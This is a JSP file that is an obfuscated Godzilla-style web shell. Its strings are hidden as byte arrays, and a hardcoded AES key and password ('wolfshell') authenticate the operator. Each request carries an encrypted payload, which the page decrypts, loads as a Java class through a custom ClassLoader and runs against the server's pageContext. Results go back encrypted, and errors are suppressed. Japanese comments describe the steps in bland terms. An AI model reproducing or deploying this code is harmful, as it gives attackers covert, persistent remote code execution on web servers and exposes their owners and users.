<%!
String k_str_x1 = new String(new byte[]{51,99,54,101,48,98,56,97,57,99,49,53,50,50,52,97});
String p_str_y2 = new String(new byte[]{119,111,108,102,115,104,101,108,108});
class Ldr_z3 extends ClassLoader{public Ldr_z3(ClassLoader p){super(p);}public Class def(byte[] b){return super.defineClass(b, 0, b.length);}}
public byte[] op_a4(byte[] s,boolean m){try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(k_str_x1.getBytes(),"AES"));return c.doFinal(s);}catch(Exception e){return null;}}
public static String h_b5(String s){String r=null;try{java.security.MessageDigest d=java.security.MessageDigest.getInstance("MD5");d.update(s.getBytes(),0,s.length());r=new java.math.BigInteger(1,d.digest()).toString(16).toUpperCase();}catch(Exception e){}return r;}
public static String e_c6(byte[] bs) throws Exception {
    // 月が綺麗ですね
    Class<?> cls; String v=null;
    try{cls=Class.forName("java.util.Base64");Object enc=cls.getMethod("getEncoder",null).invoke(cls,null);v=(String)enc.getClass().getMethod("encodeToString",new Class[]{byte[].class}).invoke(enc,new Object[]{bs});}
    catch(Exception e){try{cls=Class.forName("sun.misc.BASE64Encoder");Object enc=cls.newInstance();v=(String)enc.getClass().getMethod("encode",new Class[]{byte[].class}).invoke(enc,new Object[]{bs});}catch(Exception e2){}}
    return v;}
public static byte[] d_d7(String bs) throws Exception {
    // このAPIは非推奨です。
    Class<?> cls; byte[] v=null;
    try{cls=Class.forName("java.util.Base64");Object dec=cls.getMethod("getDecoder",null).invoke(cls,null);v=(byte[])dec.getClass().getMethod("decode",new Class[]{String.class}).invoke(dec,new Object[]{bs});}
    catch(Exception e){try{cls=Class.forName("sun.misc.BASE64Decoder");Object dec=cls.newInstance();v=(byte[])dec.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(dec,new Object[]{bs});}catch(Exception e2){}}
    return v;}
%><%
// すべての処理はここから始まります。
try{
    String c_hash = h_b5(p_str_y2+k_str_x1);
    byte[] d_bytes = d_d7(request.getParameter(p_str_y2));
    d_bytes = op_a4(d_bytes, false);
    // セッション状態を確認します。
    if (session.getAttribute("payload")==null){
        // 新しいモジュールをロードします。
        session.setAttribute("payload",new Ldr_z3(this.getClass().getClassLoader()).def(d_bytes));
    }else{
        // 既存のモジュールを実行します。
        request.setAttribute("parameters",d_bytes);
        java.io.ByteArrayOutputStream out_arr = new java.io.ByteArrayOutputStream();
        Object inst=((Class)session.getAttribute("payload")).newInstance();
        inst.equals(out_arr);
        inst.equals(pageContext);
        // 応答を生成します。
        response.getWriter().write(c_hash.substring(0,16));
        inst.toString(); // ファイナライザを呼び出す
        response.getWriter().write(e_c6(op_a4(out_arr.toByteArray(), true)));
        response.getWriter().write(c_hash.substring(16));
    }
}catch(Exception e){
    // エラーが発生しましたが、静かに処理します。
}
%>